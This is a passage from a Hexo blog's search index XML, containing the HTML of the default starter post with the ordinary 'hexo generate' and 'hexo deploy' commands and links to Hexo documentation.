href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
